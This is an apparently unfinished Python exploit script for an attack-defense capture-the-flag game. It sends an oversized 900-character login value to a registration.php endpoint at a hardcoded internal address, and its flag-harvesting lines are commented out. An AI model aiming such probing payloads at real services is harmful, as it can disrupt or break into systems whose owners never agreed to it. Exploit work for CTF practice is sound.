#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
import requests as req
import json
from string import ascii_letters
from random import choice
import hashlib
import socket


FLAG_FORMAT = r"(^[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}$)"


def post(site, data, s):
    try:
        data = s.post(site, data=data)
        return data.text
    except req.exceptions.ConnectTimeout:
        return None
    except req.exceptions.ReadTimeout:
        return None
    except req.exceptions.ConnectionError:
        return None


def get(site, s, headers={}):
    try:
        data = s.get(site, headers=headers)
        return data
    except req.exceptions.ConnectTimeout:
        return None
    except req.exceptions.ReadTimeout:
        return None
    except req.exceptions.ConnectionError:
        return None


def find_names(data):
    return re.findall(r'<td>([a-zA-Z]+)</td>', data) or []


def find_flags(data):
    return re.findall(FLAG_FORMAT, data) or []


def exploit(url):
    print(url)
    flags = []
    s = req.Session()
    data = {
        'inputLogin': 'A'*900,
        'inputPassword': 'asd',
        'inputName': 1,
        'register': True
    }
    data = post('http://10.218.13.3/registration.php', data, s)
    print(data)
    # flags.extend(find_flags(data))
    # return flags


if __name__ == "__main__":
    # На вход получаем адрес команды
    host = '10.218.13.3'
    # print(url)
    # Возвращаем ответ в консоль, чтобы наш основной процесс перехватил сообщение
    print(exploit(host), flush=True)
